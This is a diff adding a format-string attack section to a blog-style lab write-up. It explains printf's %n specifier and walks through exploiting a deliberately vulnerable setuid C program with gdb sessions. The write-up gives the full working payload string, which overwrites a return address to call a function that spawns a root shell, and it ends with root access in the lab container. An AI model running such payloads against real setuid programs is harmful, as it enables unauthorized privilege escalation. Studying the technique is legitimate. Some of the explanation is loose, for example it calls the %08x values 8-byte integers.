@@ -293,3 +293,196 @@ running as uid = 1030, euid = 0
 <span class="hljs-special">#</span> root</code></pre>
 
 <p>Yayyyyy! We exploited a program without inject shellcode!</p>
+
+
+
+<h2 id="format-string-attack">Format String Attack</h2>
+
+<p>What is a format string? Because I never paid attention to the lecture (well I actually skipped a lot), this concept was really hard for me to understand. I’ll try to summarize the concept as best as I can, but if you still find it not very clear, you can check out <a href="https://www.youtube.com/watch?v=esxEaHrMgI8&amp;list=PLMGUdaTHpFQLmSAk5_cTM8Y502hhVpeNf&amp;index=14&amp;t=2388s">Ymir’s Youtube video</a> or <a href="https://www.exploit-db.com/docs/28476.pdf">this websit</a>.</p>
+
+<p>Recall when you write C, the first line of code you wrote, it is possibly something like this. <br>
+<code>printf("%s\n","Hello World!")</code> <br>
+The symbol <code>%s</code> here is the usage of a format string. It tells the system to interpret the variable <code>"Hello World"</code> you feed to the <code>printf()</code> function as a string. Actually there are more formats like this, here is a table of several common formats . </p>
+
+<p></p><table><tbody><tr><th>Format String </th><th>Output</th><th>Usage</th></tr><tr><td>%d</td><td>Decimal</td><td>Output decimal number</td></tr><tr><td>%s</td><td>String</td><td>Read string from memory</td></tr><tr><td>%x</td><td>Hexadecimal</td><td>Output hexadecimal number</td></tr><tr><td>%n</td><td>Number of bytes written so far</td><td>Write the number of bytes written so far</td></tr></tbody></table><p></p>
+
+<p>How is usage of format string vulnerable? Say you have something like:</p>
+
+<p><code>printf("You wrote: %08x.%08x.%08x.%08x.")</code></p>
+
+<p><code>printf</code> is trying to interpret your input as a 8-byte integer, but you didn’t give him any input. What happens now? It turns out that <code>printf</code> will just grab anything on top of the memory stack and interpret it as a 8-byte integer, so the above line of code will naively print out something like :</p>
+
+<p><code>You wrote:bfd7469f.000000f0.00000006.78383025</code> </p>
+
+<p>This groups of 8-byte integer are actually data stored on the memory stack, most likely several bytes after the <code>$esp</code> pointer. You actually already exploit the program as you can get valuable information of the stack, but we want more, we want to write to the stack. The option <code>%n</code>makes this available. </p>
+
+<p>Again, if you have something like this:</p>
+
+<p><code>printf("You wrote:%08x.%08x.%08x.%n")</code></p>
+
+<p>Note we changed the last %08x of the last code to %n. What will happen now is that it will still printout 3 8-byte data stored on the stack address, but the next 8-byte will be interpreted as address and <code>%n</code> will write the number of bytes written so far into that address. So, you will write : 10 byte (“You wrote:”) + 3 * 5 bytes (%08x.)  = 25 to the address started at <code>0x78383025</code>.  Wow, you can now write some arbitrary code into the address. Not bad right?  <br>
+Below is a vulnerable program using unsafe <code>sprintf</code> to copy buf. See if we can exploit it.</p>
+
+<pre class="prettyprint"><code class="language-C hljs cpp"><span class="hljs-comment">/* Belongs to USER*/</span>
+<span class="hljs-preprocessor">#define _GNU_SOURCE</span>
+<span class="hljs-preprocessor">#include &lt;stdio.h&gt;</span>
+<span class="hljs-preprocessor">#include &lt;stdlib.h&gt;</span>
+<span class="hljs-preprocessor">#include &lt;string.h&gt;</span>
+<span class="hljs-preprocessor">#include &lt;syslog.h&gt;</span>
+<span class="hljs-preprocessor">#include &lt;unistd.h&gt;</span>
+
+
+<span class="hljs-comment">/* Oooh, this looks juicy ... */</span>
+<span class="hljs-keyword">void</span> heaven(<span class="hljs-keyword">void</span>)
+{
+        uid_t uid = geteuid();
+        setreuid (uid, uid);
+        system (<span class="hljs-string">"/bin/bash"</span>);
+}
+
+
+<span class="hljs-keyword">int</span> hall_e(<span class="hljs-keyword">char</span> *fmt)
+{
+        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">202</span>];
+        <span class="hljs-built_in">memset</span> (buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));
+        <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Hi! Welcome to the HALL-E function.\n"</span>);
+        <span class="hljs-built_in">snprintf</span> (buf, <span class="hljs-keyword">sizeof</span>(buf)-<span class="hljs-number">1</span>, <span class="hljs-string">"You said:      %s\n"</span>, fmt);
+        <span class="hljs-built_in">printf</span> (buf);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+
+
+
+<span class="hljs-keyword">int</span> main(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)
+{
+        <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)
+        {
+                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"HALL-E: Please specify your name!\n"</span>);
+                <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
+        }
+        <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Your input was of length: %d\n"</span>, <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]));
+        openlog (<span class="hljs-string">"format1"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
+        <span class="hljs-keyword">if</span> (geteuid() != getuid())
+                syslog (LOG_INFO, <span class="hljs-string">"FORMAT:rwang74:%d/%d:%d\n"</span>, getuid(), geteuid(), <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]));
+        closelog ();
+
+        hall_e (argv[<span class="hljs-number">1</span>]);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+
+<p>To reduce the difficulty, this program already embedded another method called <code>heaven()</code> that does a series of system call to spawn a shell and gives us root privilege, our job is to just call it, which can be achieved by simply put the address of <code>heaven()</code> at the next 4-bytes after <code>$ebp</code>. So first two tasks: figure out <code>heaven()</code> address and <code>$ebp</code> when the <code>hall_e()</code> function returns. We can easily do this in <code>gdb</code>. (I believe this is really simple for you by now, so I will skip the detail).</p>
+
+<p><code>heaven address: 0x08048690 <br>
+ ebp: 0xffffda30 <br>
+</code> <br>
+How can we possibly write such a complicated <code>08048690</code> to a target address. Here is the trick. <br>
+First, you need to figure out what the <code>$esp</code> look like when your input is copied to the stack, maybe it doesn’t start at  a desired position that can be interpreted as a 8-byte address and you need to put some JUNK to push it back. I will show it in <code>gdb</code></p>
+
+
+
+<pre class="prettyprint"><code class="language-gdb hljs perl">(gdb) b hall_e
+Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0x80486b0</span>: file <span class="hljs-keyword">format</span>.c, line <span class="hljs-number">20</span>.
+(gdb) run <span class="hljs-variable">$(</span>python -c <span class="hljs-string">'print "\x34\xda\xff\xff"+"%x"*9+"%"+"%n"'</span>)
+Starting program: <span class="hljs-regexp">/c0re/attackformat</span> <span class="hljs-variable">$(</span>python -c <span class="hljs-string">'print "\x34\xda\xff\xff"+"%x"*9+"%134514234x"+"%n"'</span>)
+Your input was of <span class="hljs-keyword">length</span>: <span class="hljs-number">35</span>
+
+Breakpoint <span class="hljs-number">1</span>, hall_e (
+    fmt=<span class="hljs-number">0xffffdc42</span> <span class="hljs-string">"4\332\377\377<span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%%</span>n"</span>)
+    at <span class="hljs-keyword">format</span>.c:<span class="hljs-number">20</span>
+<span class="hljs-number">20</span>      {
+(gdb) disas
+...
+
+   <span class="hljs-number">0x08048701</span> &lt;+<span class="hljs-number">81</span>&gt;:    call   <span class="hljs-number">0x80484c0</span> &lt;snprintf<span class="hljs-variable">@plt</span>&gt;
+   <span class="hljs-number">0x08048706</span> &lt;+<span class="hljs-number">86</span>&gt;:    <span class="hljs-keyword">push</span>   <span class="hljs-variable">%ebx</span>
+---Type &lt;<span class="hljs-keyword">return</span>&gt; to <span class="hljs-keyword">continue</span>, <span class="hljs-keyword">or</span> <span class="hljs-string">q &lt;return&gt;</span> to quit---
+   <span class="hljs-number">0x08048707</span> &lt;+<span class="hljs-number">87</span>&gt;:    call   <span class="hljs-number">0x8048430</span> &lt;<span class="hljs-keyword">printf</span><span class="hljs-variable">@plt</span>&gt;
+   <span class="hljs-number">0x0804870c</span> &lt;+<span class="hljs-number">92</span>&gt;:    lea    -<span class="hljs-number">0x8</span>(<span class="hljs-variable">%ebp</span>),<span class="hljs-variable">%esp</span>
+   <span class="hljs-number">0x0804870f</span> &lt;+<span class="hljs-number">95</span>&gt;:    <span class="hljs-keyword">xor</span>    <span class="hljs-variable">%eax</span>,<span class="hljs-variable">%eax</span>
+   <span class="hljs-number">0x08048711</span> &lt;+<span class="hljs-number">97</span>&gt;:    <span class="hljs-keyword">pop</span>    <span class="hljs-variable">%ebx</span>
+   <span class="hljs-number">0x08048712</span> &lt;+<span class="hljs-number">98</span>&gt;:    <span class="hljs-keyword">pop</span>    <span class="hljs-variable">%edi</span>
+   <span class="hljs-number">0x08048713</span> &lt;+<span class="hljs-number">99</span>&gt;:    <span class="hljs-keyword">pop</span>    <span class="hljs-variable">%ebp</span>
+   <span class="hljs-number">0x08048714</span> &lt;+<span class="hljs-number">100</span>&gt;:   ret
+
+...
+End of assembler <span class="hljs-keyword">dump</span>.
+(gdb) b <span class="hljs-variable">*0x08048707</span>
+Breakpoint <span class="hljs-number">2</span> at <span class="hljs-number">0x8048707</span>: file <span class="hljs-keyword">format</span>.c, line <span class="hljs-number">25</span>.
+(gdb) cont
+Continuing.
+Hi! Welcome to the HALL-E function.
+
+Breakpoint <span class="hljs-number">2</span>, <span class="hljs-number">0x08048707</span> in hall_e (
+    fmt=<span class="hljs-number">0xffffdc42</span> <span class="hljs-string">"4\332\377\377<span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%%</span>n"</span>)
+    at <span class="hljs-keyword">format</span>.c:<span class="hljs-number">25</span>
+<span class="hljs-number">25</span>              <span class="hljs-keyword">printf</span> (buf);
+(gdb) <span class="hljs-keyword">x</span>/<span class="hljs-number">32</span><span class="hljs-keyword">x</span> <span class="hljs-variable">$esp</span>
+<span class="hljs-number">0xffffd944</span>:     <span class="hljs-number">0xffffd95e</span>      <span class="hljs-number">0xffffd95e</span>      <span class="hljs-number">0x000000c9</span>      <span class="hljs-number">0x080487aa</span>
+<span class="hljs-number">0xffffd954</span>:     <span class="hljs-number">0xffffdc42</span>      <span class="hljs-number">0x080487fc</span>      <span class="hljs-number">0x6f590000</span>      <span class="hljs-number">0x61732075</span>
+<span class="hljs-number">0xffffd964</span>:     <span class="hljs-number">0x203a6469</span>      <span class="hljs-number">0x20202020</span>      <span class="hljs-number">0xffda3420</span>      <span class="hljs-number">0x257825ff</span>
+<span class="hljs-number">0xffffd974</span>:     <span class="hljs-number">0x25782578</span>      <span class="hljs-number">0x25782578</span>      <span class="hljs-number">0x25782578</span>      <span class="hljs-number">0x25782578</span>
+<span class="hljs-number">0xffffd984</span>:     <span class="hljs-number">0x35343331</span>      <span class="hljs-number">0x33323431</span>      <span class="hljs-number">0x6e257834</span>      <span class="hljs-number">0x0000000a</span>
+<span class="hljs-number">0xffffd994</span>:     <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>
+<span class="hljs-number">0xffffd9a4</span>:     <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>
+<span class="hljs-number">0xffffd9b4</span>:     <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>
+</code></pre>
+
+<p>You see what I was talking about now? May be it’s still not intuitive, let’s examine what are those stuff on stack.</p>
+
+<pre class="prettyprint"><code class="language-gdb hljs perl">(gdb) <span class="hljs-keyword">x</span>/<span class="hljs-keyword">s</span> <span class="hljs-number">0xffffd95e</span>
+<span class="hljs-number">0xffffd95e</span>:     <span class="hljs-string">"You said:    4\332\377\377<span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%x</span><span class="hljs-variable">%%</span>n\n"</span></code></pre>
+
+<p>Note the <code>0x20</code> is the ASCII code for space. Look at the place where our desired address appears. </p>
+
+<p><code>0xffda3420      0x257825ff</code></p>
+
+<p>It is broken by that one extra <code>0x20</code>, and there is no way we can interpret from a odd address, and since we can not delete that extra <code>0x20</code>, our only chance is to append our input with some junks to push the desired address back. </p>
+
+
+
+<pre class="prettyprint"><code class="language-gdb hljs applescript">(gdb) <span class="hljs-command">run</span> $(python -c 'print <span class="hljs-string">"AAA\x34\xda\xff\xff"</span>+<span class="hljs-string">"%x"</span>*<span class="hljs-number">9</span>+<span class="hljs-string">"%x"</span>+<span class="hljs-string">"%n"</span>')
+The program being debugged has been started already.
+Start <span class="hljs-keyword">it</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">beginning</span>? (y <span class="hljs-keyword">or</span> n) y
+Starting program: /c0re/attackformat $(python -c 'print <span class="hljs-string">"\x34\xda\xff\xff"</span>+<span class="hljs-string">"%x"</span>*<span class="hljs-number">9</span>+<span class="hljs-string">"%x"</span>+<span class="hljs-string">"%n"</span>')
+(gdb) cont
+Continuing.
+Hi! Welcome <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> HALL-E function.
+
+Breakpoint <span class="hljs-number">2</span>, <span class="hljs-number">0x08048707</span> <span class="hljs-keyword">in</span> hall_e (
+    fmt=<span class="hljs-number">0xffffdc42</span> <span class="hljs-string">"AAA\332\377\377%x%x%x%x%x%x%x%x%x%x%n"</span>)
+    <span class="hljs-keyword">at</span> format.c:<span class="hljs-number">25</span>
+<span class="hljs-number">25</span>              printf (buf);
+(gdb) x/<span class="hljs-number">32</span>x $esp
+<span class="hljs-number">0xffffd944</span>:     <span class="hljs-number">0xffffd95e</span>      <span class="hljs-number">0xffffd95e</span>      <span class="hljs-number">0x000000c9</span>      <span class="hljs-number">0x080487aa</span>
+<span class="hljs-number">0xffffd954</span>:     <span class="hljs-number">0xffffdc42</span>      <span class="hljs-number">0x080487fc</span>      <span class="hljs-number">0x6f590000</span>      <span class="hljs-number">0x61732075</span>
+<span class="hljs-number">0xffffd964</span>:     <span class="hljs-number">0x203a6469</span>      <span class="hljs-number">0x20202020</span>      <span class="hljs-number">0x41414120</span>      <span class="hljs-number">0xffffda34</span>
+<span class="hljs-number">0xffffd974</span>:     <span class="hljs-number">0x25782578</span>      <span class="hljs-number">0x25782578</span>      <span class="hljs-number">0x25782578</span>      <span class="hljs-number">0x25782578</span>
+<span class="hljs-number">0xffffd984</span>:     <span class="hljs-number">0x25782578</span>      <span class="hljs-number">0x35343331</span>      <span class="hljs-number">0x33323431</span>      <span class="hljs-number">0x6e257834</span>      
+<span class="hljs-number">0xffffd994</span>:     <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>
+<span class="hljs-number">0xffffd9a4</span>:     <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>
+<span class="hljs-number">0xffffd9b4</span>:     <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>
+</code></pre>
+
+<p>Hmm, much better, but the number of bytes we wrote so far is too small and how can we get to 0x08048690. It turns out that there is a convenient operation called “width of format string” that can help us with this. You simply put a number before the last <code>%x</code> before your <code>%n</code> and that number will be added to the number of bytes written so far. LOL that is so freaking convenient.  <br>
+Tune up your payload to something like this: <br>
+<code>$(python -c 'print "AAA\x34\xda\xff\xff"+"%x"*9+"%134514234x"+"%n"')</code> <br>
+and run it in gdb. </p>
+
+
+
+<pre class="prettyprint"><code class=" hljs vhdl">(gdb) run $(python -c <span class="hljs-attribute">'print</span> <span class="hljs-string">"AAA\x34\xda\xff\xff"</span>+<span class="hljs-string">"%x"</span>*<span class="hljs-number">9</span>+<span class="hljs-string">"%134514234x"</span>+<span class="hljs-string">"%n"</span>')
+(gdb) cont
+(gdb) cont</code></pre>
+
+<p>after it put a huge width … We entered the shell. Let’s try it in real program.</p>
+
+
+
+<pre class="prettyprint"><code class=" hljs ruby">rwang74<span class="hljs-variable">@bb7bd829ff8f</span><span class="hljs-symbol">:/c0re</span><span class="hljs-variable">$ </span>/c0re/attackformat <span class="hljs-variable">$(</span>python -c <span class="hljs-string">'print "AAA\x34\xda\xff\xff"+"%x"*9+"%134514234x"+"%n"'</span>)
+
+                                           <span class="hljs-number">41414120</span>
+root<span class="hljs-variable">@bb7bd829ff8f</span><span class="hljs-symbol">:/c0re</span><span class="hljs-comment"># whoami</span>
+root</code></pre>
+
+<p>God damn that is so easy. </p>
